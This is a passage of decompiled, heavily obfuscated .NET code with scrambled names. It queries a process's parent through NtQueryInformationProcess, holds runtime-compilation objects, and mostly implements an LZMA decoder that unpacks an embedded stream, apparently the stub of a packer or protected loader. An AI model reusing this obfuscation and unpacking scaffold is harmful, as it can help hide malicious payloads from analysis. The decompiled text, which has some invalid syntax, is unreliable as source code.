	static extern int Depth { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x0600004F RID: 79 RVA: 0x00019CB8 File Offset: 0x00019CB8
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int QueryAssemblyInfo(int int_28);

	// Token: 0x06000050 RID: 80 RVA: 0x00019CD4 File Offset: 0x00019CD4
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int View(int int_28);

	// Token: 0x04000001 RID: 1
	private static <Module>.get_RaftingContainerGradientBegin OnStart;

	// Token: 0x04000002 RID: 2
	public static string string_0;

	// Token: 0x04000003 RID: 3
	public static string string_1;

	// Token: 0x04000004 RID: 4
	public static string string_2;

	// Token: 0x04000005 RID: 5
	public static Module module_0;

	// Token: 0x04000006 RID: 6
	public unsafe static byte* pByte_0;

	// Token: 0x04000007 RID: 7
	public unsafe static byte* pByte_1;

	// Token: 0x04000008 RID: 8
	public static ushort ushort_0;

	// Token: 0x04000009 RID: 9
	public static ushort ushort_1;

	// Token: 0x0400000A RID: 10
	public unsafe static byte* pByte_2;

	// Token: 0x0400000B RID: 11
	public unsafe static byte* pByte_3;

	// Token: 0x0400000C RID: 12
	public unsafe static byte* pByte_4;

	// Token: 0x0400000D RID: 13
	public unsafe static byte* pByte_5;

	// Token: 0x0400000E RID: 14
	public unsafe static byte* pByte_6;

	// Token: 0x0400000F RID: 15
	public unsafe static byte* pByte_7;

	// Token: 0x04000010 RID: 16
	public static uint uint_0;

	// Token: 0x04000011 RID: 17
	public static int int_0;

	// Token: 0x04000012 RID: 18
	public static int int_1;

	// Token: 0x04000013 RID: 19
	public static int int_2;

	// Token: 0x04000014 RID: 20
	public unsafe static byte* pByte_8;

	// Token: 0x04000015 RID: 21
	public static ushort ushort_2;

	// Token: 0x04000016 RID: 22
	public static int int_3;

	// Token: 0x04000017 RID: 23
	public static int int_4;

	// Token: 0x04000018 RID: 24
	public static uint uint_1;

	// Token: 0x04000019 RID: 25
	public static uint uint_2;

	// Token: 0x0400001A RID: 26
	public static uint[] uint_3;

	// Token: 0x0400001B RID: 27
	public static uint[] uint_4;

	// Token: 0x0400001C RID: 28
	public static uint[] uint_5;

	// Token: 0x0400001D RID: 29
	public static int int_5;

	// Token: 0x0400001E RID: 30
	public static int int_6;

	// Token: 0x0400001F RID: 31
	public unsafe static byte* pByte_9;

	// Token: 0x04000020 RID: 32
	public static uint uint_6;

	// Token: 0x04000021 RID: 33
	public static int int_7;

	// Token: 0x04000022 RID: 34
	public unsafe static byte* pByte_10;

	// Token: 0x04000023 RID: 35
	public static uint uint_7;

	// Token: 0x04000024 RID: 36
	public static int int_8;

	// Token: 0x04000025 RID: 37
	public static uint uint_8;

	// Token: 0x04000026 RID: 38
	public static int int_9;

	// Token: 0x04000027 RID: 39
	public static int int_10;

	// Token: 0x04000028 RID: 40
	public static int int_11;

	// Token: 0x04000029 RID: 41
	public static int int_12;

	// Token: 0x0400002A RID: 42
	public unsafe static byte* pByte_11;

	// Token: 0x0400002B RID: 43
	public static uint uint_9;

	// Token: 0x0400002C RID: 44
	public static int int_13;

	// Token: 0x0400002D RID: 45
	public unsafe static byte* pByte_12;

	// Token: 0x0400002E RID: 46
	public static ushort ushort_3;

	// Token: 0x0400002F RID: 47
	public static int int_14;

	// Token: 0x04000030 RID: 48
	public static int int_15;

	// Token: 0x04000031 RID: 49
	public static <Module>.get_RaftingContainerGradientBegin get_RaftingContainerGradientBegin_0;

	// Token: 0x04000032 RID: 50
	public static int int_16;

	// Token: 0x04000033 RID: 51
	public static int int_17;

	// Token: 0x04000034 RID: 52
	public static Process process_0;

	// Token: 0x04000035 RID: 53
	public static OpenFileDialog openFileDialog_0;

	// Token: 0x04000036 RID: 54
	public static string string_3;

	// Token: 0x04000037 RID: 55
	public static CompilerParameters compilerParameters_0;

	// Token: 0x04000038 RID: 56
	public static string string_4;

	// Token: 0x04000039 RID: 57
	public static CompilerResults compilerResults_0;

	// Token: 0x0400003A RID: 58
	public static IEnumerator ienumerator_0;

	// Token: 0x0400003B RID: 59
	public static IDisposable idisposable_0;

	// Token: 0x0400003C RID: 60
	public static int[] int_18;

	// Token: 0x0400003D RID: 61
	public static int[] int_19;

	// Token: 0x0400003E RID: 62
	public static byte[] byte_0;

	// Token: 0x0400003F RID: 63
	public static int int_20;

	// Token: 0x04000040 RID: 64
	public static int int_21;

	// Token: 0x04000041 RID: 65
	public static int int_22;

	// Token: 0x04000042 RID: 66
	public static int int_23;

	// Token: 0x04000043 RID: 67
	public static int int_24;

	// Token: 0x04000044 RID: 68
	public static DateTime dateTime_0;

	// Token: 0x04000045 RID: 69
	public static Random random_0;

	// Token: 0x04000046 RID: 70
	public static StringBuilder stringBuilder_0;

	// Token: 0x04000047 RID: 71
	public static int int_25;

	// Token: 0x04000048 RID: 72
	public static char char_0;

	// Token: 0x04000049 RID: 73
	public static string string_5;

	// Token: 0x0400004A RID: 74
	public static int int_26;

	// Token: 0x0400004B RID: 75
	public static char char_1;

	// Token: 0x0400004C RID: 76
	public static int int_27;

	// Token: 0x0400004D RID: 77
	internal static byte[] SetTextIndent;

	// Token: 0x0400004E RID: 78 RVA: 0x00002050 File Offset: 0x00000250
	internal static <Module>.get_IsFullyTrusted DoPasteCommand;

	// Token: 0x0400004F RID: 79
	internal static Assembly DuplicateTableName2;

	// Token: 0x04000050 RID: 80 RVA: 0x00002290 File Offset: 0x00000490
	internal static <Module>.set_InTransition GetValuePaintIndent;

	// Token: 0x04000051 RID: 81
	internal static Assembly get_DisplayStyleForCurrentCellOnly;

	// Token: 0x04000052 RID: 82 RVA: 0x00002950 File Offset: 0x00000B50
	internal static <Module>.FUNDTYPE isCONSTANT_OK;

	// Token: 0x02000002 RID: 2
	private struct get_RaftingContainerGradientBegin
	{
		// Token: 0x17000013 RID: 19
		// (set) Token: 0x06000051 RID: 81
		private static ref extern int CredentialPolicy { [DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess")] set; }

		// Token: 0x06000052 RID: 82 RVA: 0x00005018 File Offset: 0x00003218
		internal Process GenerateCodeFromNamespace()
		{
			return <Module>.get_RaftingContainerGradientBegin.get_ThreadingModel(Process.GetCurrentProcess().Handle);
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00005034 File Offset: 0x00003234
		internal static Process PushValue(int int_0)
		{
			return <Module>.get_RaftingContainerGradientBegin.get_ThreadingModel(Process.GetProcessById(int_0).Handle);
		}

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000054 RID: 84 RVA: 0x00005054 File Offset: 0x00003254
		internal static Process ThreadingModel
		{
			get
			{
				<Module>.get_RaftingContainerGradientBegin_0 = default(<Module>.get_RaftingContainerGradientBegin);
				<Module>.int_17 = <Module>.get_RaftingContainerGradientBegin.set_CredentialPolicy(intptr_0, 0, ref <Module>.get_RaftingContainerGradientBegin_0, Marshal.SizeOf(<Module>.get_RaftingContainerGradientBegin_0), ref <Module>.int_16);
				if (<Module>.int_17 == 0)
				{
					try
					{
						<Module>.process_0 = Process.GetProcessById(<Module>.get_RaftingContainerGradientBegin_0.get_IsMetric.ToInt32());
						goto IL_67;
					}
					catch (ArgumentException)
					{
						<Module>.process_0 = null;
						goto IL_67;
					}
					goto IL_5C;
					IL_67:
					return <Module>.process_0;
				}
				IL_5C:
				throw new Win32Exception(<Module>.int_17);
			}
		}

		// Token: 0x04000053 RID: 83
		internal IntPtr IsSupported;

		// Token: 0x04000054 RID: 84
		internal IntPtr get_Bits;

		// Token: 0x04000055 RID: 85
		internal IntPtr DrawAndFillEllipse;

		// Token: 0x04000056 RID: 86
		internal IntPtr SqlConnectionContainer;

		// Token: 0x04000057 RID: 87
		internal IntPtr Win32Error;

		// Token: 0x04000058 RID: 88
		internal IntPtr get_IsMetric;
	}

	// Token: 0x02000003 RID: 3
	internal struct WebSocketException
	{
		// Token: 0x06000055 RID: 85 RVA: 0x000050E0 File Offset: 0x000032E0
		internal void ResolveMatchingCodeGroups()
		{
			this.OleDbServicesWrapper = 1024U;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x000050F8 File Offset: 0x000032F8
		internal uint ForEach(<Module>.GetParamForMethodIndex getParamForMethodIndex_0)
		{
			uint num = (getParamForMethodIndex_0.isBaseCall >> 11) * this.OleDbServicesWrapper;
			if (getParamForMethodIndex_0.CheckBoxStandardAdapter < num)
			{
				getParamForMethodIndex_0.isBaseCall = num;
				this.OleDbServicesWrapper += 2048U - this.OleDbServicesWrapper >> 5;
				if (getParamForMethodIndex_0.isBaseCall < 16777216U)
				{
					getParamForMethodIndex_0.CheckBoxStandardAdapter = (getParamForMethodIndex_0.CheckBoxStandardAdapter << 8 | (uint)((byte)getParamForMethodIndex_0.DeflateInit2_.ReadByte()));
					getParamForMethodIndex_0.isBaseCall <<= 8;
				}
				return 0U;
			}
			getParamForMethodIndex_0.isBaseCall -= num;
			getParamForMethodIndex_0.CheckBoxStandardAdapter -= num;
			this.OleDbServicesWrapper -= this.OleDbServicesWrapper >> 5;
			if (getParamForMethodIndex_0.isBaseCall < 16777216U)
			{
				getParamForMethodIndex_0.CheckBoxStandardAdapter = (getParamForMethodIndex_0.CheckBoxStandardAdapter << 8 | (uint)((byte)getParamForMethodIndex_0.DeflateInit2_.ReadByte()));
				getParamForMethodIndex_0.isBaseCall <<= 8;
			}
			return 1U;
		}

		// Token: 0x04000059 RID: 89
		internal uint OleDbServicesWrapper;
	}

	// Token: 0x02000004 RID: 4
	internal struct FileNotFoundException
	{
		// Token: 0x06000057 RID: 87 RVA: 0x000051E4 File Offset: 0x000033E4
		internal FileNotFoundException(int int_0)
		{
			this.DataGridViewCellErrorTextNeededEventHandler = int_0;
			this.ICommandToManagedAdapter = new <Module>.WebSocketException[1 << int_0];
		}

		// Token: 0x06000058 RID: 88 RVA: 0x0000520C File Offset: 0x0000340C
		internal void SetStatusText()
		{
			uint num = 1U;
			while ((ulong)num < (ulong)(1L << (this.DataGridViewCellErrorTextNeededEventHandler & 31)))
			{
				this.ICommandToManagedAdapter[(int)num].ResolveMatchingCodeGroups();
				num += 1U;
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00005244 File Offset: 0x00003444
		internal uint ReadUInt64At(<Module>.GetParamForMethodIndex getParamForMethodIndex_0)
		{
			uint num = 1U;
			for (int i = this.DataGridViewCellErrorTextNeededEventHandler; i > 0; i--)
			{
				num = (num << 1) + this.ICommandToManagedAdapter[(int)num].ForEach(getParamForMethodIndex_0);
			}
			return num - (1U << this.DataGridViewCellErrorTextNeededEventHandler);
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00005288 File Offset: 0x00003488
		internal uint DataGridColumnStyle(<Module>.GetParamForMethodIndex getParamForMethodIndex_0)
		{
			uint num = 1U;
			uint num2 = 0U;
			for (int i = 0; i < this.DataGridViewCellErrorTextNeededEventHandler; i++)
			{
				uint num3 = this.ICommandToManagedAdapter[(int)num].ForEach(getParamForMethodIndex_0);
				num <<= 1;
				num += num3;
				num2 |= num3 << i;
			}
			return num2;
		}

		// Token: 0x0600005B RID: 91 RVA: 0x000052D0 File Offset: 0x000034D0
		internal static uint Branch(<Module>.WebSocketException[] webSocketException_0, uint uint_0, <Module>.GetParamForMethodIndex getParamForMethodIndex_0, int int_0)
		{
			uint num = 1U;
			uint num2 = 0U;
			for (int i = 0; i < int_0; i++)
			{
				uint num3 = webSocketException_0[(int)(uint_0 + num)].ForEach(getParamForMethodIndex_0);
				num <<= 1;
				num += num3;
				num2 |= num3 << i;
			}
			return num2;
		}

		// Token: 0x0400005A RID: 90
		internal readonly <Module>.WebSocketException[] ICommandToManagedAdapter;

		// Token: 0x0400005B RID: 91
		internal readonly int DataGridViewCellErrorTextNeededEventHandler;
	}

	// Token: 0x02000005 RID: 5
	internal class GetParamForMethodIndex
	{
		// Token: 0x0600005C RID: 92 RVA: 0x00005310 File Offset: 0x00003510
		internal void DataTableMapping(Stream stream_0)
		{
			this.DeflateInit2_ = stream_0;
			this.CheckBoxStandardAdapter = 0U;
			this.isBaseCall = uint.MaxValue;
			for (int i = 0; i < 5; i++)
			{
				this.CheckBoxStandardAdapter = (this.CheckBoxStandardAdapter << 8 | (uint)((byte)this.DeflateInit2_.ReadByte()));
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x0000535C File Offset: 0x0000355C
		internal void DateTimeNative()
		{
			this.DeflateInit2_ = null;
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00005370 File Offset: 0x00003570
		internal void ChoiceNode()
		{
			while (this.isBaseCall < 16777216U)
			{
				this.CheckBoxStandardAdapter = (this.CheckBoxStandardAdapter << 8 | (uint)((byte)this.DeflateInit2_.ReadByte()));
				this.isBaseCall <<= 8;
			}
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x0600005F RID: 95 RVA: 0x000053B8 File Offset: 0x000035B8
		internal uint MemberName
		{
			get
			{
				uint num = this.isBaseCall;
				uint num2 = this.CheckBoxStandardAdapter;
				uint num3 = 0U;
				for (int i = int_0; i > 0; i--)
				{
					num >>= 1;
					uint num4 = num2 - num >> 31;
					num2 -= (num & num4 - 1U);
					num3 = (num3 << 1 | 1U - num4);
					if (num < 16777216U)
					{
						num2 = (num2 << 8 | (uint)((byte)this.DeflateInit2_.ReadByte()));
						num <<= 8;
					}
				}
				this.isBaseCall = num;
				this.CheckBoxStandardAdapter = num2;
				return num3;
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x0000542C File Offset: 0x0000362C
		internal GetParamForMethodIndex()
		{
		}

		// Token: 0x0400005C RID: 92
		internal uint CheckBoxStandardAdapter;

		// Token: 0x0400005D RID: 93
		internal uint isBaseCall;

		// Token: 0x0400005E RID: 94
		internal Stream DeflateInit2_;
	}

	// Token: 0x02000006 RID: 6
	internal class get_IsClosed
	{
		// Token: 0x06000061 RID: 97 RVA: 0x00005440 File Offset: 0x00003640
		internal get_IsClosed()
		{
			this.get_BoundedCapacity = uint.MaxValue;
			int num = 0;
			while ((long)num < 4L)
			{
				this.SendOrPostCallback[num] = new <Module>.FileNotFoundException(6);
				num++;
			}
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00005534 File Offset: 0x00003734
		internal void XmlTypeCode(uint uint_0)
		{
			if (this.get_BoundedCapacity != uint_0)
			{
				this.get_BoundedCapacity = uint_0;
				this.OLECMDID = Math.Max(this.get_BoundedCapacity, 1U);
				uint uint_ = Math.Max(this.OLECMDID, 4096U);
				this.ObjectIDGenerator.get_LastOperation(uint_);
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00005580 File Offset: 0x00003780
		internal void add_Exited(int int_0, int int_1)
		{
			this.remove_SearchForVirtualItem.set_WindowStyle(int_0, int_1);
		}

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x06000064 RID: 100 RVA: 0x0000559C File Offset: 0x0000379C
		internal event int NodeRemoving
		{
			add
			{
				uint num = 1U << value;
				this.set_Locale.GenerateEvidence(num);
				this.get_ForegroundColor.GenerateEvidence(num);
				this.get_BodyName = num - 1U;
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x000055D4 File Offset: 0x000037D4
		internal void SafeCryptMsgHandle(Stream stream_0, Stream stream_1)
		{
			this.set_AddressList.DataTableMapping(stream_0);
			this.ObjectIDGenerator.DynamicILGenerator(stream_1, this.<ScanSystemIdAsync>d__188);
			for (uint num = 0U; num < 12U; num += 1U)
			{
				for (uint num2 = 0U; num2 <= this.get_BodyName; num2 += 1U)
				{
					uint num3 = (num << 4) + num2;
					this.CachedData[(int)num3].ResolveMatchingCodeGroups();
					this.get_NextPage[(int)num3].ResolveMatchingCodeGroups();
				}
				this.GetAssemblyEnumerator[(int)num].ResolveMatchingCodeGroups();
				this.get_ReshowDelay[(int)num].ResolveMatchingCodeGroups();
				this.ReadMemberRefRow[(int)num].ResolveMatchingCodeGroups();
				this.IAdviseSink[(int)num].ResolveMatchingCodeGroups();
			}
			this.remove_SearchForVirtualItem.get_PdbState();
			for (uint num = 0U; num < 4U; num += 1U)
			{
				this.SendOrPostCallback[(int)num].SetStatusText();
			}
			for (uint num = 0U; num < 114U; num += 1U)
			{
				this.CreateBuffer[(int)num].ResolveMatchingCodeGroups();
			}
			this.set_Locale.GetDataHere();
			this.get_ForegroundColor.GetDataHere();
			this.getType.SetStatusText();
		}

		// Token: 0x06000066 RID: 102 RVA: 0x000056F8 File Offset: 0x000038F8
		internal void ArrayWithOffset(Stream stream_0, Stream stream_1, long long_0, long long_1)
		{
			this.SafeCryptMsgHandle(stream_0, stream_1);
			<Module>.set_WindowHeight set_WindowHeight = default(<Module>.set_WindowHeight);
			set_WindowHeight.GetTextExtentPoint32W();
			uint num = 0U;
			uint num2 = 0U;
			uint num3 = 0U;
			uint num4 = 0U;
			ulong num5 = 0UL;
			if (0L < long_1)
			{
				this.CachedData[(int)((int)set_WindowHeight.get_Part << 4)].ForEach(this.set_AddressList);
				set_WindowHeight.remove_AllowNavigationChanged();
				byte byte_ = this.remove_SearchForVirtualItem.add_ContextMenuShowing(this.set_AddressList, 0U, 0);
				this.ObjectIDGenerator.GetUserStoreForAssembly(byte_);
				num5 += 1UL;
			}
			while (num5 < (ulong)long_1)
			{
				uint num6 = (uint)num5 & this.get_BodyName;
				if (this.CachedData[(int)((set_WindowHeight.get_Part << 4) + num6)].ForEach(this.set_AddressList) != 0U)
				{
					uint num8;
					if (this.GetAssemblyEnumerator[(int)set_WindowHeight.get_Part].ForEach(this.set_AddressList) == 1U)
					{
						if (this.get_ReshowDelay[(int)set_WindowHeight.get_Part].ForEach(this.set_AddressList) == 0U)
						{
							if (this.get_NextPage[(int)((set_WindowHeight.get_Part << 4) + num6)].ForEach(this.set_AddressList) == 0U)
							{
								set_WindowHeight.IExtender();
								this.ObjectIDGenerator.GetUserStoreForAssembly(this.ObjectIDGenerator.SetViewportExtEx(num));
								num5 += 1UL;
								continue;
							}
						}
						else
						{
							uint num7;
							if (this.ReadMemberRefRow[(int)set_WindowHeight.get_Part].ForEach(this.set_AddressList) == 0U)
							{
								num7 = num2;
							}
							else
							{
								if (this.IAdviseSink[(int)set_WindowHeight.get_Part].ForEach(this.set_AddressList) != 0U)
								{
									num7 = num4;
									num4 = num3;
								}
								else
								{
									num7 = num3;
								}
								num3 = num2;
							}
							num2 = num;
							num = num7;
						}
						num8 = this.get_ForegroundColor.CreateSymUnmanagedWriter2(this.set_AddressList, num6) + 2U;
						set_WindowHeight.get_AbbrAxis();
					}
					else
					{
						num4 = num3;
						num3 = num2;
						num2 = num;
						num8 = 2U + this.set_Locale.CreateSymUnmanagedWriter2(this.set_AddressList, num6);
						set_WindowHeight.GetClassLayout();
						uint num9 = this.SendOrPostCallback[(int)<Module>.get_IsClosed.get_KeyValue(num8)].ReadUInt64At(this.set_AddressList);
						if (num9 < 4U)
						{
							num = num9;
						}
						else
						{
							int num10 = (int)((num9 >> 1) - 1U);
							num = (2U | (num9 & 1U)) << num10;
							if (num9 >= 14U)
							{
								num += this.set_AddressList.get_MemberName(num10 - 4) << 4;
								num += this.getType.DataGridColumnStyle(this.set_AddressList);
							}
							else
							{
								num += <Module>.FileNotFoundException.Branch(this.CreateBuffer, num - num9 - 1U, this.set_AddressList, num10);
							}
						}
					}
					if (((ulong)num >= num5 || num >= this.OLECMDID) && num == 4294967295U)
					{
						break;
					}
					this.ObjectIDGenerator.set_SelfAffectingThreading(num, num8);
					num5 += (ulong)num8;
				}
				else
				{
					byte byte_2 = this.ObjectIDGenerator.SetViewportExtEx(0U);
					byte byte_3;
					if (!set_WindowHeight.AppDomainLevelActivator())
					{
						byte_3 = this.remove_SearchForVirtualItem.Prepare(this.set_AddressList, (uint)num5, byte_2, this.ObjectIDGenerator.SetViewportExtEx(num));
					}
					else
					{
						byte_3 = this.remove_SearchForVirtualItem.add_ContextMenuShowing(this.set_AddressList, (uint)num5, byte_2);
					}
					this.ObjectIDGenerator.GetUserStoreForAssembly(byte_3);
					set_WindowHeight.remove_AllowNavigationChanged();
					num5 += 1UL;
				}
			}
			this.ObjectIDGenerator.set_FrameworkDisplayName();
			this.ObjectIDGenerator.get_ObjectFromWin32Handle();
			this.set_AddressList.DateTimeNative();
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00005A60 File Offset: 0x00003C60
		internal void Invert(byte[] byte_0)
		{
			int int_ = (int)(byte_0[0] % 9);
			byte b = byte_0[0] / 9;
			int int_2 = (int)(b % 5);
			int value = (int)(b / 5);
			uint num = 0U;
			for (int i = 0; i < 4; i++)
			{
				num += (uint)((uint)byte_0[1 + i] << i * 8);
			}
			this.XmlTypeCode(num);
			this.add_Exited(int_2, int_);
			this.NodeRemoving += value;
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000068 RID: 104 RVA: 0x00005ABC File Offset: 0x00003CBC
		internal static uint KeyValue
		{
			get
			{
				uint_0 -= 2U;
				if (uint_0 >= 4U)
				{
					return 3U;
				}
				return uint_0;
			}
		}

		// Token: 0x0400005F RID: 95
		internal readonly <Module>.WebSocketException[] CachedData = new <Module>.WebSocketException[192];

		// Token: 0x04000060 RID: 96
		internal readonly <Module>.WebSocketException[] get_NextPage = new <Module>.WebSocketException[192];

		// Token: 0x04000061 RID: 97
		internal readonly <Module>.WebSocketException[] GetAssemblyEnumerator = new <Module>.WebSocketException[12];

		// Token: 0x04000062 RID: 98
		internal readonly <Module>.WebSocketException[] get_ReshowDelay = new <Module>.WebSocketException[12];

		// Token: 0x04000063 RID: 99
		internal readonly <Module>.WebSocketException[] ReadMemberRefRow = new <Module>.WebSocketException[12];

		// Token: 0x04000064 RID: 100
		internal readonly <Module>.WebSocketException[] IAdviseSink = new <Module>.WebSocketException[12];

		// Token: 0x04000065 RID: 101
		internal readonly <Module>.get_IsClosed.Module set_Locale = new <Module>.get_IsClosed.Module();

		// Token: 0x04000066 RID: 102
		internal readonly <Module>.get_IsClosed.TrustManagerMoreInformation remove_SearchForVirtualItem = new <Module>.get_IsClosed.TrustManagerMoreInformation();

		// Token: 0x04000067 RID: 103
		internal readonly <Module>.InvalidOperationException ObjectIDGenerator = new <Module>.InvalidOperationException();

		// Token: 0x04000068 RID: 104
		internal readonly <Module>.WebSocketException[] CreateBuffer = new <Module>.WebSocketException[114];

		// Token: 0x04000069 RID: 105
		internal readonly <Module>.FileNotFoundException[] SendOrPostCallback = new <Module>.FileNotFoundException[4];

		// Token: 0x0400006A RID: 106
		internal readonly <Module>.GetParamForMethodIndex set_AddressList = new <Module>.GetParamForMethodIndex();

		// Token: 0x0400006B RID: 107
		internal readonly <Module>.get_IsClosed.Module get_ForegroundColor = new <Module>.get_IsClosed.Module();

		// Token: 0x0400006C RID: 108
		internal bool <ScanSystemIdAsync>d__188;

		// Token: 0x0400006D RID: 109
		internal uint get_BoundedCapacity;

		// Token: 0x0400006E RID: 110
		internal uint OLECMDID;

		// Token: 0x0400006F RID: 111
		internal <Module>.FileNotFoundException getType = new <Module>.FileNotFoundException(4);

		// Token: 0x04000070 RID: 112
		internal uint get_BodyName;

		// Token: 0x02000007 RID: 7
		internal class Module
		{
			// Token: 0x06000069 RID: 105 RVA: 0x00005AD8 File Offset: 0x00003CD8
			internal void GenerateEvidence(uint uint_0)
			{
				for (uint num = this.add_ResolveName; num < uint_0; num += 1U)
				{
					this.get_RejectInputOnFirstFailure[(int)num] = new <Module>.FileNotFoundException(3);
					this.get_ConsumptionScope[(int)num] = new <Module>.FileNotFoundException(3);
				}
				this.add_ResolveName = uint_0;
			}

			// Token: 0x0600006A RID: 106 RVA: 0x00005B24 File Offset: 0x00003D24
			internal void GetDataHere()
			{
				this.XmlSerializationWriterCodeGen.ResolveMatchingCodeGroups();
				for (uint num = 0U; num < this.add_ResolveName; num += 1U)
				{
					this.get_RejectInputOnFirstFailure[(int)num].SetStatusText();
					this.get_ConsumptionScope[(int)num].SetStatusText();
				}
				this.set_AllowFullOpen.ResolveMatchingCodeGroups();
				this.set_AddExtension.SetStatusText();
			}

			// Token: 0x0600006B RID: 107 RVA: 0x00005B88 File Offset: 0x00003D88
			internal uint CreateSymUnmanagedWriter2(<Module>.GetParamForMethodIndex getParamForMethodIndex_0, uint uint_0)
			{
				if (this.XmlSerializationWriterCodeGen.ForEach(getParamForMethodIndex_0) == 0U)
				{
					return this.get_RejectInputOnFirstFailure[(int)uint_0].ReadUInt64At(getParamForMethodIndex_0);
				}
				uint num = 8U;
				if (this.set_AllowFullOpen.ForEach(getParamForMethodIndex_0) != 0U)
				{
					num += 8U;
					num += this.set_AddExtension.ReadUInt64At(getParamForMethodIndex_0);
				}
				else
				{
					num += this.get_ConsumptionScope[(int)uint_0].ReadUInt64At(getParamForMethodIndex_0);
				}
				return num;
			}

			// Token: 0x0600006C RID: 108 RVA: 0x00005BF4 File Offset: 0x00003DF4
			internal Module()
			{
			}

			// Token: 0x04000071 RID: 113
			internal readonly <Module>.FileNotFoundException[] get_RejectInputOnFirstFailure = new <Module>.FileNotFoundException[16];

			// Token: 0x04000072 RID: 114
			internal readonly <Module>.FileNotFoundException[] get_ConsumptionScope = new <Module>.FileNotFoundException[16];

			// Token: 0x04000073 RID: 115
			internal <Module>.WebSocketException XmlSerializationWriterCodeGen;

			// Token: 0x04000074 RID: 116
			internal <Module>.WebSocketException set_AllowFullOpen;

			// Token: 0x04000075 RID: 117
			internal <Module>.FileNotFoundException set_AddExtension = new <Module>.FileNotFoundException(8);

			// Token: 0x04000076 RID: 118
			internal uint add_ResolveName;
		}

		// Token: 0x02000008 RID: 8
		internal class TrustManagerMoreInformation
		{
			// Token: 0x17000017 RID: 23
			// (set) Token: 0x0600006D RID: 109 RVA: 0x00005C30 File Offset: 0x00003E30
			internal int WindowStyle
			{
				set
				{
					if (this.add_RenderToolStripBorder != null && this.get_ResourceTypeManifestResourcesDependency == value)
					{
						if (this.SetInternalSourceType == int_0)
						{
							return;
						}
					}
					this.SetInternalSourceType = int_0;
					this.get_IsFamily = (1U << int_0) - 1U;
					this.get_ResourceTypeManifestResourcesDependency = value;
					uint num = 1U << this.get_ResourceTypeManifestResourcesDependency + this.SetInternalSourceType;
					this.add_RenderToolStripBorder = new <Module>.get_IsClosed.TrustManagerMoreInformation.set_PrintToFile[num];
					for (uint num2 = 0U; num2 < num; num2 += 1U)
					{
						this.add_RenderToolStripBorder[(int)num2].SelectPicture();
					}
				}
			}

			// Token: 0x0600006E RID: 110 RVA: 0x00005CB4 File Offset: 0x00003EB4
			internal void get_PdbState()
			{
				uint num = 1U << this.get_ResourceTypeManifestResourcesDependency + this.SetInternalSourceType;
				for (uint num2 = 0U; num2 < num; num2 += 1U)
				{
					this.add_RenderToolStripBorder[(int)num2].MdiClient();
				}
			}

			// Token: 0x0600006F RID: 111 RVA: 0x00005CF4 File Offset: 0x00003EF4
			internal uint RC2CryptoServiceProvider(uint uint_0, byte byte_0)
			{
				return ((uint_0 & this.get_IsFamily) << this.get_ResourceTypeManifestResourcesDependency) + (uint)(byte_0 >> 8 - this.get_ResourceTypeManifestResourcesDependency);
			}

			// Token: 0x06000070 RID: 112 RVA: 0x00005D24 File Offset: 0x00003F24
			internal byte add_ContextMenuShowing(<Module>.GetParamForMethodIndex getParamForMethodIndex_0, uint uint_0, byte byte_0)
			{
				return this.add_RenderToolStripBorder[(int)this.RC2CryptoServiceProvider(uint_0, byte_0)].FromFriendlyName(getParamForMethodIndex_0);
			}

			// Token: 0x06000071 RID: 113 RVA: 0x00005D4C File Offset: 0x00003F4C
			internal byte Prepare(<Module>.GetParamForMethodIndex getParamForMethodIndex_0, uint uint_0, byte byte_0, byte byte_1)
			{
				return this.add_RenderToolStripBorder[(int)this.RC2CryptoServiceProvider(uint_0, byte_0)].Indexer_Get_Delegate`1(getParamForMethodIndex_0, byte_1);
			}

			// Token: 0x06000072 RID: 114 RVA: 0x0000542C File Offset: 0x0000362C
			internal TrustManagerMoreInformation()
			{
			}

			// Token: 0x04000077 RID: 119
			internal <Module>.get_IsClosed.TrustManagerMoreInformation.set_PrintToFile[] add_RenderToolStripBorder;

			// Token: 0x04000078 RID: 120
			internal int SetInternalSourceType;

			// Token: 0x04000079 RID: 121
			internal int get_ResourceTypeManifestResourcesDependency;

			// Token: 0x0400007A RID: 122
			internal uint get_IsFamily;

			// Token: 0x02000009 RID: 9
			internal struct set_PrintToFile
			{
				// Token: 0x06000073 RID: 115 RVA: 0x00005D74 File Offset: 0x00003F74
				internal void SelectPicture()
				{
					this.get_DefaultDropDownDirection = new <Module>.WebSocketException[768];
				}

				// Token: 0x06000074 RID: 116 RVA: 0x00005D94 File Offset: 0x00003F94
				internal void MdiClient()
				{
					for (int i = 0; i < 768; i++)
					{
						this.get_DefaultDropDownDirection[i].ResolveMatchingCodeGroups();
					}
				}

				// Token: 0x06000075 RID: 117 RVA: 0x00005DC4 File Offset: 0x00003FC4
				internal byte FromFriendlyName(<Module>.GetParamForMethodIndex getParamForMethodIndex_0)
				{
					uint num = 1U;
					do
					{
						num = (num << 1 | this.get_DefaultDropDownDirection[(int)num].ForEach(getParamForMethodIndex_0));
					}
					while (num < 256U);
					return (byte)num;
				}

				// Token: 0x06000076 RID: 118 RVA: 0x00005DF8 File Offset: 0x00003FF8
				internal byte Indexer_Get_Delegate(<Module>.GetParamForMethodIndex getParamForMethodIndex_0, byte byte_0)
				{
					uint num = 1U;
					for (;;)
					{
						uint num2 = (uint)(byte_0 >> 7 & 1);
						byte_0 = (byte)(byte_0 << 1);
						uint num3 = this.get_DefaultDropDownDirection[(int)((1U + num2 << 8) + num)].ForEach(getParamForMethodIndex_0);
						num = (num << 1 | num3);
						if (num2 != num3)
						{
							break;
						}
						if (num >= 256U)
						{
							goto IL_5C;
						}
					}
